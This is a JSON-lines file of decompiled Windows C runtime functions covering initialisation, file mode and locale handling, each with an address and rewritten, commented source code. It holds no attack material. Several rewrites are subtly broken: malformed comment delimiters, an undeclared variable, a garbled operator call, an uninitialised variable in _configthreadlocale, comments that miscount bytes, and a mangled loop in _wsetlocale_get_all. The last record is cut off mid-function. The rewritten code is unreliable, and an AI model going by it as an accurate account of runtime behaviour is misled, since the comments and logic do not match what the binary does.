{"Function Name": "_initterm", "Address": "140013470", "Source Code": "\nvoid _initterm(undefined8 *start_ptr, undefined8 *end_ptr)\n{\n    ulonglong loop_counter = 0; // Initialize loop counter\n    ulonglong element_count = (ulonglong)((longlong)end_ptr + (7 - (longlong)start_ptr)) >> 3; // Calculate the number of elements to process\n\n    if (end_ptr < start_ptr) { // Check if the end pointer is less than the start pointer\n        element_count = 0; // Set the number of elements to process to zero if the condition is true\n    }\n\n    while (loop_counter < element_count) { // Loop through the elements\n        if (*start_ptr != 0) { // Check if the current element is not null\n            (*(code *)PTR__guard_dispatch_icall_1400213e8)(); // Call the function pointed to by PTR__guard_dispatch_icall_1400213e8\n        }\n        start_ptr++; // Move to the next element\n        loop_counter++; // Increment the loop counter\n    }\n}\n"}
{"Function Name": "_initterm_e", "Address": "1400134d4", "Source Code": "\nundefined8 _initterm_e(undefined8 *start_ptr, undefined8 *end_ptr)\n{\n    undefined8 return_value; // Variable to store the return value from the function call\n    while (start_ptr != end_ptr) { // Loop until param_1 equals param_2\n        if ((*start_ptr != 0) && // Check if the current element pointed by param_1 is not zero\n           (return_value = (*(code *)PTR__guard_dispatch_icall_1400213e8)(), // Call the function pointed by PTR__guard_dispatch_icall_1400213e8\n           (int)return_value != 0)) { // Check if the return value is not zero\n            return return_value; // Return the non-zero value if the condition is met\n        }\n        start_ptr++; // Move to the next element in the array\n    }\n    return 0; // Return 0 if all elements are processed without returning a non-zero value\n}\n"}
{"Function Name": "_set_fmode", "Address": "140013514", "Source Code": "\nerrno_t __cdecl _set_fmode(int mode)\n{\n    // Check if _Mode is a valid mode (not equal to 0xc000 and within a specific range)\n    if (((mode - 0x4000U & 0xffff3fff) == 0) && (mode != 0xc000)) {\n        acquire_lock();  // Acquire a lock for thread safety\n        release_lock(); // Release the lock\n        global_mode = mode; // Set the global variable to the new mode\n        return 0; // Return success\n    } else {\n        *get_dos_error() = 0x16; // Set the error code to indicate an invalid mode\n        handle_error(); // Call a function to handle the error\n        return 0x16; // Return the error code\n    }\n}\n"}
{"Function Name": "__crt_seh_guarded_call<void>::operator()<class_<lambda_1d892b297fdedeee07ed8124eeb2f2fa>,class_<lambda_ffc046909424fd52df0ac47e64813305>&___ptr64,class_<lambda_01a7098693036236037e7cdb9bca3d73>_>", "Address": "140013554", "Source Code": "\\*\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_1d892b297fdedeee07ed8124eeb2f2fa>,class_<lambda_ffc046909424fd52df0ac47e64813305>&___ptr64,class_<lambda_01a7098693036236037e7cdb9bca3d73>_>\n(__crt_seh_guarded_call<void> *this,<lambda_1d892b297fdedeee07ed8124eeb2f2fa> *param_1,\n<lambda_ffc046909424fd52df0ac47e64813305> *param_2,\n<lambda_01a7098693036236037e7cdb9bca3d73> *param_3)\n{\n    longlong lVar3; // Variable to store the result of locale setting\n    short *psVar4; // Pointer to short for locale comparison\n\n    __acrt_lock(*(int *)param_1); // Acquire lock for thread safety\n\n    // Call a function with parameters derived from param_2\n    FUN_140013b08((undefined8 *)**(undefined8 **)param_2,\n                  *(undefined8 **)(**(longlong **)(param_2 + 8) + 0x90));\n\n    // Set the locale and store the result\n    lVar3 = _wsetlocale_nolock(**(longlong **)param_2, **(int **)(param_2 + 0x18),\n                               (wchar_t *)**(undefined8 **)(param_2 + 0x20));\n    **(longlong **)(param_2 + 0x10) = lVar3; // Store the locale result\n\n    if (lVar3 == 0) { // Check if locale setting failed\n        __acrt_release_locale_ref(**(longlong **)param_2); // Release locale reference\n        __acrt_free_locale(**(longlong **)param_2); // Free locale resources\n    } else {\n        psVar4 = (short *)**(undefined8 **)(param_2 + 0x20); // Get pointer to locale string\n        if (psVar4 != (short *)0x0) { // Check if locale string is not null\n            longlong lVar3 = (longlong)&DAT_140038318 - (longlong)psVar4; // Calculate offset\n            do {\n                short sVar1 = *psVar4; // Get current character\n                short sVar2 = *(short *)((longlong)psVar4 + lVar3); // Get corresponding character from reference\n                if (sVar1 != sVar2) break; // Break if characters do not match\n                psVar4 = psVar4 + 1; // Move to next character\n            } while (sVar2 != 0); // Continue until null terminator\n\n            if (sVar1 != sVar2) { // If there was a mismatch\n                LOCK(); // Acquire lock\n                DAT_14003a284 = 1; // Set a flag indicating a change\n                UNLOCK(); // Release lock\n            }\n        }\n\n        // Update locale information without locking\n        _updatetlocinfoEx_nolock\n        ((longlong *)(**(longlong **)(param_2 + 8) + 0x90),\n         (undefined **)**(undefined8 **)param_2);\n\n        __acrt_release_locale_ref(**(longlong **)param_2); // Release locale reference\n\n        // Check conditions to update global locale information\n        if (((*(byte *)(**(longlong **)(param_2 + 8) + 0x3a8) & 2) == 0) &&\n            (((byte)DAT_1400381a4 & 1) == 0)) {\n            _updatetlocinfoEx_nolock\n            ((longlong *)&DAT_14003a448, *(undefined ***)(**(longlong **)(param_2 + 8) + 0x90));\n            PTR_PTR_140038178 = (undefined *)DAT_14003a448[0x1f]; // Update pointer to locale data\n            PTR_DAT_1400380c0 = (undefined *)*DAT_14003a448; // Update another pointer\n            _DAT_1400381a8 = *(undefined4 *)(DAT_14003a448 + 1); // Update a global variable\n        }\n    }\n\n    __acrt_unlock(*(int *)param_3); // Release lock for thread safety\n    return; // Exit function\n}\n*\\ \n \n\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_1d892b297fdedeee07ed8124eeb2f2fa>,class_<lambda_ffc046909424fd52df0ac47e64813305>&___ptr64,class_<lambda_01a7098693036236037e7cdb9bca3d73>_>\n(__crt_seh_guarded_call<void> *this,<lambda_1d892b297fdedeee07ed8124eeb2f2fa> *param_1,\n<lambda_ffc046909424fd52df0ac47e64813305> *param_2,\n<lambda_01a7098693036236037e7cdb9bca3d73> *param_3)\n{\nlonglong lVar3;\nshort *psVar4;\n__acrt_lock(*(int *)param_1);\nFUN_140013b08((undefined8 *)**(undefined8 **)param_2,\n*(undefined8 **)(**(longlong **)(param_2 + 8) + 0x90));\nlVar3 = _wsetlocale_nolock(**(longlong **)param_2,**(int **)(param_2 + 0x18),\n(wchar_t *)**(undefined8 **)(param_2 + 0x20));\n**(longlong **)(param_2 + 0x10) = lVar3;\nif (lVar3 == 0) {\n    __acrt_release_locale_ref(**(longlong **)param_2);\n    __acrt_free_locale(**(longlong **)param_2);\n} else {\n    psVar4 = (short *)**(undefined8 **)(param_2 + 0x20);\n    if (psVar4 != (short *)0x0) {\n        longlong lVar3 = (longlong)&DAT_140038318 - (longlong)psVar4;\n        do {\n            short sVar1 = *psVar4;\n            short sVar2 = *(short *)((longlong)psVar4 + lVar3);\n            if (sVar1 != sVar2) break;\n            psVar4 = psVar4 + 1;\n        } while (sVar2 != 0);\n        if (sVar1 != sVar2) {\n            LOCK();\n            DAT_14003a284 = 1;\n            UNLOCK();\n        }\n    }\n    _updatetlocinfoEx_nolock\n    ((longlong *)(**(longlong **)(param_2 + 8) + 0x90),\n    (undefined **)**(undefined8 **)param_2);\n    __acrt_release_locale_ref(**(longlong **)param_2);\n    if (((*(byte *)(**(longlong **)(param_2 + 8) + 0x3a8) & 2) == 0) &&\n    (((byte)DAT_1400381a4 & 1) == 0)) {\n        _updatetlocinfoEx_nolock\n        ((longlong *)&DAT_14003a448,*(undefined ***)(**(longlong **)(param_2 + 8) + 0x90));\n        PTR_PTR_140038178 = (undefined *)DAT_14003a448[0x1f];\n        PTR_DAT_1400380c0 = (undefined *)*DAT_14003a448;\n        _DAT_1400381a8 = *(undefined4 *)(DAT_14003a448 + 1);\n    }\n}\n__acrt_unlock(*(int *)param_3);\nreturn;\n}\n"}
{"Function Name": "__crt_seh_guarded_call<void>::operator()<class_<lambda_410d79af7f07d98d83a3f525b3859a53>,class_<lambda_3e16ef9562a7dcce91392c22ab16ea36>&___ptr64,class_<lambda_38119f0e861e05405d8a144b9b982f0a>_>", "Address": "140013690", "Source Code": "\\*\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_410d79af7f07d98d83a3f525b3859a53>,class_<lambda_3e16ef9562a7dcce91392c22ab16ea36>&___ptr64,class_<lambda_38119f0e861e05405d8a144b9b982f0a>_>\n(__crt_seh_guarded_call<void> *this,<lambda_410d79af7f07d98d83a3f525b3859a53> *param_1,\n<lambda_3e16ef9562a7dcce91392c22ab16ea36> *param_2,\n<lambda_38119f0e861e05405d8a144b9b982f0a> *param_3)\n{\n    longlong *plVar2; // Pointer to iterate through a range of longlong values\n\n    __acrt_lock(*(int *)param_1); // Acquire a lock using the value pointed to by param_1\n\n    // Iterate through a range of memory addresses from DAT_14003a448 to DAT_14003a450\n    for (plVar2 = &DAT_14003a448; plVar2 != &DAT_14003a450; plVar2++) {\n        // Check if the value at the current address is not equal to PTR_DAT_1400381b0\n        if ((undefined **)*plVar2 != &PTR_DAT_1400381b0) {\n            // Update the value at the current address using _updatetlocinfoEx_nolock\n            *plVar2 = (longlong)_updatetlocinfoEx_nolock(plVar2,&PTR_DAT_1400381b0);\n        }\n    }\n\n    __acrt_unlock(*(int *)param_3); // Release the lock using the value pointed to by param_3\n    return; // Exit the function\n}\n*\\ \n \n\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_410d79af7f07d98d83a3f525b3859a53>,class_<lambda_3e16ef9562a7dcce91392c22ab16ea36>&___ptr64,class_<lambda_38119f0e861e05405d8a144b9b982f0a>_>\n(__crt_seh_guarded_call<void> *this,<lambda_410d79af7f07d98d83a3f525b3859a53> *param_1,\n<lambda_3e16ef9562a7dcce91392c22ab16ea36> *param_2,\n<lambda_38119f0e861e05405d8a144b9b982f0a> *param_3)\n{\nlonglong *plVar2;\n__acrt_lock(*(int *)param_1);\nfor (plVar2 = &DAT_14003a448; plVar2 != &DAT_14003a450; plVar2++) {\nif ((undefined **)*plVar2 != &PTR_DAT_1400381b0) {\n*plVar2 = (longlong)_updatetlocinfoEx_nolock(plVar2,&PTR_DAT_1400381b0);\n}\n}\n__acrt_unlock(*(int *)param_3);\nreturn;\n}\n"}
{"Function Name": "__crt_seh_guarded_call<void>::operator()<class_<lambda_7f2adfce497ff2baa965cd4f576ecfd1>,class_<lambda_2a444430fde8c29194d880d93eed5e8f>&___ptr64,class_<lambda_8dff2cf36a5417162780cd64fa2883ef>&___ptr64>", "Address": "140013700", "Source Code": "\\*\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_7f2adfce497ff2baa965cd4f576ecfd1>,class_<lambda_2a444430fde8c29194d880d93eed5e8f>&___ptr64,class_<lambda_8dff2cf36a5417162780cd64fa2883ef>&___ptr64>\n(__crt_seh_guarded_call<void> *this, // Pointer to the current instance of __crt_seh_guarded_call\n<lambda_7f2adfce497ff2baa965cd4f576ecfd1> *param_1, // First parameter of type lambda_7f2adfce497ff2baa965cd4f576ecfd1\n<lambda_2a444430fde8c29194d880d93eed5e8f> *param_2, // Second parameter of type lambda_2a444430fde8c29194d880d93eed5e8f\n<lambda_8dff2cf36a5417162780cd64fa2883ef> *param_3) // Third parameter of type lambda_8dff2cf36a5417162780cd64fa2883ef\n{\n    param_2->operator()(); // Call the operator() method of the second parameter (lambda_2a444430fde8c29194d880d93eed5e8f)\n    *(uint *)(**(longlong **)param_3 + 0x3a8) &= 0xffffffef; // Modify a specific bit in a member of the third parameter (lambda_8dff2cf36a5417162780cd64fa2883ef)\n}\n*\\ \n \n\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_7f2adfce497ff2baa965cd4f576ecfd1>,class_<lambda_2a444430fde8c29194d880d93eed5e8f>&___ptr64,class_<lambda_8dff2cf36a5417162780cd64fa2883ef>&___ptr64>\n(__crt_seh_guarded_call<void> *this,<lambda_7f2adfce497ff2baa965cd4f576ecfd1> *param_1,\n<lambda_2a444430fde8c29194d880d93eed5e8f> *param_2,\n<lambda_8dff2cf36a5417162780cd64fa2883ef> *param_3)\n{\n    param_2->operator()();\n    *(uint *)(**(longlong **)param_3 + 0x3a8) &= 0xffffffef;\n}\n"}
{"Function Name": "<lambda_2a444430fde8c29194d880d93eed5e8f>::operator()", "Address": "14001372c", "Source Code": "\nvoid __thiscall\n<lambda_2a444430fde8c29194d880d93eed5e8f>::operator()\n(<lambda_2a444430fde8c29194d880d93eed5e8f> *this)\n{\n    LPVOID pvVar1; // Pointer to hold allocated memory\n    __crt_seh_guarded_call<void> local_res8[8]; // Array for SEH guarded calls\n    undefined8 local_38; // Variable to store a value from 'this'\n    \n    pvVar1 = _calloc_base(1, 0x158); // Allocate memory of size 0x158 bytes\n    **(undefined8 **)this = pvVar1; // Store allocated memory address in 'this'\n    _free_base((LPVOID)0x0); // Free memory at address 0 (no-op)\n    \n    if (pvVar1 != (LPVOID)0x0) { // Check if memory allocation was successful\n        local_38 = *(undefined8 *)this; // Retrieve the value stored in 'this'\n        __crt_seh_guarded_call<void>::\n        operator()<class_<lambda_1d892b297fdedeee07ed8124eeb2f2fa>, class_<lambda_ffc046909424fd52df0ac47e64813305>&___ptr64, class_<lambda_01a7098693036236037e7cdb9bca3d73>_>\n        (local_res8, (undefined4 *)0x4, (undefined8 *)&local_38, (undefined4 *)0x4); // Call SEH guarded operator with parameters\n    }\n}\n"}
{"Function Name": "__acrt_copy_locale_name", "Address": "1400137bc", "Source Code": "\nwchar_t * __acrt_copy_locale_name(undefined1 (*locale_name_ptr) [32])\n{\n    ulonglong locale_name_size; // Variable to hold the size of the locale name\n    wchar_t *destination_buffer; // Pointer to the destination buffer for the locale name\n\n    // Check if the input parameter is null or if the size of the locale name is invalid\n    if (locale_name_ptr == (undefined1 (*) [32])0x0 || (locale_name_size = FUN_1400121a8(locale_name_ptr, 0x55), 0x54 < locale_name_size) || (destination_buffer = (wchar_t *)_malloc_base(locale_name_size * 2 + 2), destination_buffer == (wchar_t *)0x0)) {\n        destination_buffer = (wchar_t *)0x0; // Set destination to null if any checks fail\n    } else {\n        // Copy the locale name to the destination buffer safely\n        if (wcsncpy_s(destination_buffer, locale_name_size + 1, (wchar_t *)locale_name_ptr, locale_name_size + 1) != 0) {\n            // Invoke error handling if the copy operation fails\n            _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n        }\n    }\n    return destination_buffer; // Return the destination buffer (or null if failed)\n}\n"}
{"Function Name": "FUN_140013840", "Address": "140013840", "Source Code": "\nundefined4 FUN_140013840(void)\n{\n    // Declare a variable to store the current value of DAT_14003a284\n    undefined4 currentValue = sharedResource;\n\n    // Acquire a lock to ensure thread safety\n    LOCK();\n\n    // Set DAT_14003a284 to 1\n    sharedResource = 1;\n\n    // Release the lock after modifying the shared resource\n    UNLOCK();\n\n    // Return the original value of DAT_14003a284\n    return currentValue;\n}\n"}
{"Function Name": "__acrt_uninitialize_locale", "Address": "14001384c", "Source Code": "\nvoid __acrt_uninitialize_locale(void) // Function to uninitialize locale settings\n{\n    <lambda_3e16ef9562a7dcce91392c22ab16ea36> local_results_array[8]; // Declare an array of lambda objects for local results\n    __crt_seh_guarded_call<void>:: // Begin a SEH (Structured Exception Handling) guarded call\n    operator()<class_<lambda_410d79af7f07d98d83a3f525b3859a53>,class_<lambda_3e16ef9562a7dcce91392c22ab16ea36>&___ptr64,class_<lambda_38119f0e861e05405d8a144b9b982f0a>_> // Specify template parameters for the operator\n    ((__crt_seh_guarded_call<void> *)local_results_array, // Pass the local result array as the first argument\n    (<lambda_410d79af7f07d98d83a3f525b3859a53> *)local_results_array, // Cast local_res8 to the first lambda type\n    local_results_array, // Pass the local result array as the second argument\n    (<lambda_38119f0e861e05405d8a144b9b982f0a> *)local_results_array); // Cast local_res8 to the second lambda type\n    return; // Exit the function\n}\n"}
{"Function Name": "__lc_lctowcs", "Address": "14001387c", "Source Code": "\nvoid __lc_lctowcs(wchar_t *destination, rsize_t destination_size, wchar_t *source)\n{\n    // Attempt to copy the wide character string from param_3 to param_1\n    if (wcscpy_s(destination, destination_size, source) == 0) {\n        // Check if the character at index 0x40 in param_3 is not the null terminator\n        if (source[0x40] != L'\\0') {\n            // Concatenate additional data to param_1 if the condition is met\n            _wcscats(destination, destination_size, 2, &DAT_140029360);\n        }\n        // Check if the character at index 0x80 in param_3 is not the null terminator\n        if (source[0x80] != L'\\0') {\n            // Concatenate additional data to param_1 if the condition is met\n            _wcscats(destination, destination_size, 2, &DAT_140029364);\n        }\n        return; // Exit the function if the copy was successful\n    }\n    // Invoke error handling if the copy operation failed\n    _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n}\n"}
{"Function Name": "__lc_wcstolc", "Address": "140013920", "Source Code": "\nundefined8 __lc_wcstolc(undefined1 (*output_array) [16], wchar_t *input_string)\n{\n    wchar_t *current_position; // Pointer to the current position in the input wide string\n    wchar_t current_char;   // Variable to hold the character at the current position\n    errno_t copy_result;   // Variable to store the result of the safe string copy function\n    size_t max_length; // Variable to hold the maximum count of characters to process\n    int processing_stage = 0;   // State variable to track the processing stage\n\n    // Initialize the param_1 array with some values\n    FUN_14000c740(output_array, 0, 0x1ca);\n    \n    // Check if the input string is not empty\n    if (*input_string != L'\\0') {\n        // Check if the first character is not a dot and the next character is not the end of the string\n        if ((*input_string != L'.') || (input_string[1] == L'\\0')) {\n            do {\n                // Find the length of the substring until any of the characters in \"_.,\"\n                max_length = wcscspn(input_string, L\"_.,\");\n                \n                // If no valid characters are found, return an error code\n                if (max_length == 0) {\n                    return 0xffffffff;\n                }\n                \n                // Move the pointer to the next character after the found substring\n                current_position = input_string + max_length;\n                current_char = *current_position; // Get the character at the current position\n\n                // If we are in the first stage of processing\n                if (processing_stage == 0) {\n                    // Check if the substring length exceeds 63 characters\n                    if (0x3f < max_length) {\n                        return 0xffffffff; // Return error if too long\n                    }\n                    // Safely copy the substring to the first part of param_1\n                    copy_result = wcsncpy_s((wchar_t *)output_array, 0x40, input_string, max_length);\n                    if (copy_result != 0) {\n                        goto LAB_140013a86; // Handle error if copy fails\n                    }\n                    // Check if the next character is not a dot\n                    if (current_char != L'.') {\n                        goto LAB_140013a50; // Move to the next stage\n                    }\n                    processing_stage = 1; // Move to the next processing stage\n                    // Check if the character after the dot is 'u' or 'U'\n                    if (current_position[1] != L'u' && current_position[1] != L'U') {\n                        return 0xffffffff; // Return error if not valid\n                    }\n                    goto LAB_140013a50; // Move to the next stage\n                } else {\n                    // If we are in the second stage of processing\n                    if (processing_stage == 1) {\n                        // Check if the substring length exceeds 63 characters or if it contains an underscore\n                        if (0x3f < max_length || current_char == L'_') {\n                            return 0xffffffff; // Return error if too long or invalid\n                        }\n                        // Safely copy the substring to the second part of param_1\n                        copy_result = wcsncpy_s((wchar_t *)(output_array + 8), 0x40, input_string, max_length);\n                        if (copy_result != 0) {\n                            goto LAB_140013a86; // Handle error if copy fails\n                        }\n                    } else {\n                        // If we are in the third stage of processing\n                        if (0xf < max_length || (current_char != L'\\0' && current_char != L',')) {\n                            return 0xffffffff; // Return error if too long or invalid\n                        }\n                        // Safely copy the substring to the third part of param_1\n                        copy_result = wcsncpy_s((wchar_t *)(output_array + 0x10), 0x10, input_string, max_length);\n                        if (copy_result != 0) {\n                            goto LAB_140013a86; // Handle error if copy fails\n                        }\n                    }\n                LAB_140013a50:\n                    // Check if the current character is a comma or the end of the string\n                    if (current_char == L',' || current_char == L'\\0') {\n                        return 0; // Return success if end of processing\n                    }\n                }\n                // Move to the next character in the input string\n                input_string = current_position + 1;\n                processing_stage++; // Increment the processing stage\n            } while (true); // Continue processing until a return condition is met\n        }\n    }\n    // Safely copy the substring after the dot to the third part of param_1\n    copy_result = wcsncpy_s((wchar_t *)(output_array + 0x10), 0x10, input_string + 1, 0xf);\n    if (copy_result != 0) {\n    LAB_140013a86:\n        // Invoke error handling if the copy fails\n        _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n    }\n    // Null-terminate the last part of the param_1 array\n    *(undefined2 *)(output_array[0x11] + 0xe) = 0;\n    return 0; // Return success\n}\n"}
{"Function Name": "_configthreadlocale", "Address": "140013a9c", "Source Code": "\nint __cdecl _configthreadlocale(int flag)\n{\n    // Retrieve the pointer to the thread data structure\n    longlong threadDataPtr = __acrt_getptd();\n    \n    // Get the current locale configuration from the thread data\n    uint currentLocaleConfig = *(uint *)(threadDataPtr + 0x3a8);\n    uint newLocaleConfig;\n\n    // Check the value of _Flag to determine the action\n    if (flag == -1) {\n        // Set the locale configuration to an invalid state\n        DAT_1400381a4 = 0xffffffff;\n    } else if (flag == 1) {\n        // Enable the locale setting by setting the second bit\n        newLocaleConfig = currentLocaleConfig | 2;\n    } else if (flag == 2) {\n        // Disable the locale setting by clearing the second bit\n        newLocaleConfig = currentLocaleConfig & 0xfffffffd;\n    } else {\n        // If _Flag is invalid, set the error code and call the error handling function\n        ulong *errorPtr = __doserrno();\n        *errorPtr = 0x16;\n        FUN_14000ecf8();\n        return -1; // Return error code\n    }\n\n    // Update the thread's locale configuration\n    *(uint *)(threadDataPtr + 0x3a8) = newLocaleConfig;\n    \n    // Return the status of the locale setting (1 if enabled, 0 if disabled)\n    return 2 - (uint)((currentLocaleConfig & 2) != 0);\n}\n"}
{"Function Name": "FUN_140013b08", "Address": "140013b08", "Source Code": "\nvoid FUN_140013b08(undefined8 *destination_array, undefined8 *source_array)\n{\n    // Check if both input pointers are not null and are not the same\n    if (source_array != (undefined8 *)0x0 && destination_array != (undefined8 *)0x0 && destination_array != source_array) {\n        longlong loop_counter = 2; // Initialize loop counter\n        undefined8 *dest_ptr = destination_array; // Pointer to the destination array\n        undefined8 *src_ptr = source_array; // Pointer to the source array\n\n        // Loop to copy 32 bytes (16 undefined8 values) from param_2 to param_1\n        do {\n            // Copy 16 undefined8 values in pairs\n            for (int index = 0; index < 16; index += 2) {\n                dest_ptr[index] = src_ptr[index]; // Copy even indexed value\n                dest_ptr[index + 1] = src_ptr[index + 1]; // Copy odd indexed value\n            }\n            loop_counter--; // Decrement loop counter\n            dest_ptr += 16; // Move destination pointer to the next block\n            src_ptr += 16; // Move source pointer to the next block\n        } while (loop_counter != 0); // Continue until 2 blocks are copied\n\n        // Copy additional 12 bytes (6 undefined8 values) from param_2 to param_1\n        for (int index = 0; index < 6; index += 2) {\n            dest_ptr[index + 0x10] = src_ptr[index + 0x10]; // Copy even indexed value\n            dest_ptr[index + 0x11] = src_ptr[index + 0x11]; // Copy odd indexed value\n        }\n\n        *(undefined4 *)(destination_array + 2) = 0; // Set the third element of param_1 to 0\n        __acrt_add_locale_ref((longlong)destination_array); // Increment locale reference count for param_1\n    }\n    return; // Exit the function\n}\n"}
{"Function Name": "_wcscats", "Address": "140013fac", "Source Code": "\nvoid _wcscats(wchar_t *destination_string, rsize_t destination_size, int num_strings, undefined8 additional_param)\n{\n    errno_t error_code; // Variable to store the error code from wcscat_s\n    int loop_counter; // Loop counter variable\n    int *string_pointer = (int *)&num_strings; // Pointer to the integer parameter param_3\n\n    if (num_strings > 0) { // Check if param_3 is greater than 0\n        for (loop_counter = 0; loop_counter < num_strings; loop_counter++) { // Loop through param_3 times\n            string_pointer += 2; // Move the pointer forward by 2 integers\n            error_code = wcscat_s(destination_string, destination_size, *(wchar_t **)string_pointer); // Concatenate the string\n            if (error_code != 0) { // Check if there was an error during concatenation\n                _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling function\n            }\n        }\n    }\n}\n"}
{"Function Name": "_wsetlocale", "Address": "140014014", "Source Code": "\\*\nwchar_t * __cdecl _wsetlocale(int _Category, wchar_t *_Locale)\n{\n    ulong *dosErrorPtr; // Pointer to an unsigned long variable\n    longlong threadLocalDataPtr; // Variable to store a long long result\n    wchar_t *localePointer = (wchar_t *)0x0; // Initialize a wide character pointer to null\n\n    // Check if the category is valid (less than 6)\n    if ((uint)_Category < 6) {\n        threadLocalDataPtr = __acrt_getptd(); // Get the thread-local data pointer\n        __acrt_eagerly_load_locale_apis(); // Load locale APIs eagerly\n        FUN_14001b354(); // Call a function (presumably to set locale)\n        \n        // Update a specific flag in the thread-local data\n        *(uint *)(threadLocalDataPtr + 0x3a8) |= 0x10;\n\n        // Perform a guarded call with lambda functions\n        __crt_seh_guarded_call<void>::operator<\n            class_<lambda_7f2adfce497ff2baa965cd4f576ecfd1>, \n            class_<lambda_2a444430fde8c29194d880d93eed5e8f>&___ptr64, \n            class_<lambda_8dff2cf36a5417162780cd64fa2883ef>&___ptr64>\n            ((__crt_seh_guarded_call<void> *)local_res18, local_res18, \n            (longlong *)&threadLocalDataPtr, (longlong *)&localePointer);\n    } else {\n        dosErrorPtr = __doserrno(); // Get the pointer to the DOS error number\n        *dosErrorPtr = 0x16; // Set the error number to 22 (invalid argument)\n        FUN_14000ecf8(); // Call a function (presumably to handle the error)\n    }\n    \n    return localePointer; // Return the locale pointer (null if error occurred)\n}\n*\\ \n \n\nwchar_t * __cdecl _wsetlocale(int _Category, wchar_t *_Locale)\n{\n    ulong *dosErrorPtr;\n    longlong threadLocalDataPtr;\n    wchar_t *localePointer = (wchar_t *)0x0;\n\n    if ((uint)_Category < 6) {\n        threadLocalDataPtr = __acrt_getptd();\n        __acrt_eagerly_load_locale_apis();\n        FUN_14001b354();\n        *(uint *)(threadLocalDataPtr + 0x3a8) |= 0x10;\n        __crt_seh_guarded_call<void>::operator()<class_<lambda_7f2adfce497ff2baa965cd4f576ecfd1>, class_<lambda_2a444430fde8c29194d880d93eed5e8f>&___ptr64, class_<lambda_8dff2cf36a5417162780cd64fa2883ef>&___ptr64>\n            ((__crt_seh_guarded_call<void> *)local_res18, local_res18, (longlong *)&threadLocalDataPtr, (longlong *)&localePointer);\n    } else {\n        dosErrorPtr = __doserrno();\n        *dosErrorPtr = 0x16;\n        FUN_14000ecf8();\n    }\n    return localePointer;\n}\n"}
{"Function Name": "_wsetlocale_get_all", "Address": "1400140b8", "Source Code": "\nwchar_t * _wsetlocale_get_all(longlong param_1)\n{\n    int referenceCount; // Variable to hold integer value for reference counting\n    int *referenceCountPtr; // Pointer to integer for reference counting\n    errno_t errorCode; // Variable to hold error codes from string operations\n    wchar_t *allocatedString = (wchar_t *)_malloc_base(0x6a6); // Allocate memory for wide character string\n    wchar_t *destinationString = allocatedString; // Pointer to destination string\n\n    if (allocatedString != (wchar_t *)0x0) { // Check if memory allocation was successful\n        destinationString += 2; // Move pointer to skip the first two characters\n        *destinationString = L'\\0'; // Null-terminate the destination string\n        allocatedString[0] = L'\\x01'; // Set first character of allocated string\n        allocatedString[1] = L'\\0'; // Null-terminate the allocated string\n        \n        // Concatenate LC_COLLATE string to destination\n        _wcscats(destinationString, 0x351, 3, PTR_u_LC_COLLATE_140029228);\n        \n        bool conditionsMet = true; // Flag to check if all conditions are met\n        do {\n            errorCode = wcscat_s(destinationString, 0x351, L\";\"); // Append semicolon to destination\n            if (errorCode != 0) { // Check for errors in concatenation\n                _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handler\n            }\n            short *shortArrayPtr = (short *)*(undefined8 *)(param_1 + 0x48); // Get pointer to short array\n            longlong shortArrayLength = *(undefined8 *)(param_1 + 0x48 + 4) - (longlong)shortArrayPtr; // Calculate length of short array\n            short currentShortValue, endShortValue; // Variables to hold short values for comparison\n\n            do {\n                currentShortValue = *shortArrayPtr; // Get current short value\n                endShortValue = *(short *)((longlong)shortArrayPtr + shortArrayLength); // Get corresponding short value from the end of the array\n                if (currentShortValue != endShortValue) break; // Break if values do not match\n                shortArrayPtr++; // Move to the next short value\n            } while (endShortValue != 0); // Continue until null terminator is reached\n\n            // Update the flag based on comparison results\n            conditionsMet = (currentShortValue == endShortValue) ? conditionsMet : false;\n            // Concatenate additional string to destination\n            _wcscats(destinationString, 0x351, 3, *(undefined8 *)(param_1 + 0x48 + 3));\n        } while ((longlong)(*(undefined8 *)(param_1 + 0x48 + 3)) < 0x140029288); // Loop until condition is met\n\n        if (conditionsMet) { // Check if all conditions were satisfied\n            _free_base(allocatedString); // Free allocated memory\n            for (int index = 0; index < 2; index++) { // Loop through reference counts\n                referenceCountPtr = *(int **)(param_1 + 0x30 + index * 8); // Get pointer to reference count\n                if (referenceCountPtr != (int *)0x0) { // Check if pointer is valid\n                    LOCK(); // Acquire lock for thread safety\n                    referenceCount = *referenceCountPtr; // Get current reference count\n                    *referenceCountPtr = *referenceCountPtr - 1; // Decrement reference count\n                    UNLOCK(); // Release lock\n                    if (referenceCount == 1) { // Check if reference count reached zero\n                        _free_base(*(LPVOID *)(param_1 + 0x30 + index * 8)); // Free associated memory\n                    }\n                }\n            }\n            destinationString = *(wchar_t **)(param_1 + 0x68); // Set destination to a new value\n            // Reset reference counts and pointers\n            *(undefined8 *)(param_1 + 0x30) = 0;\n            *(undefined8 *)(param_1 + 0x20) = 0;\n            *(undefined8 *)(param_1 + 0x38) = 0;\n            *(undefined8 *)(param_1 + 0x28) = 0;\n        } else { // If conditions were not satisfied\n            for (int index = 0; index < 2; index++) { // Loop through reference counts\n                referenceCountPtr = *(int **)(param_1 + 0x30 + index * 8); // Get pointer to reference count\n                if (referenceCountPtr != (int *)0x0) { // Check if pointer is valid\n                    LOCK(); // Acquire lock for thread safety\n                    referenceCount = *referenceCountPtr; // Get current reference count\n                    *referenceCountPtr = *referenceCountPtr - 1; // Decrement reference count\n                    UNLOCK(); // Release lock\n                    if (referenceCount == 1) { // Check if reference count reached zero\n                        _free_base(*(LPVOID *)(param_1 + 0x30 + index * 8)); // Free associated memory\n                    }\n                }\n            }\n            // Reset reference counts and pointers\n            *(undefined8 *)(param_1 + 0x30) = 0;\n            *(undefined8 *)(param_1 + 0x20) = 0;\n            *(wchar_t **)(param_1 + 0x38) = allocatedString; // Set new pointer\n            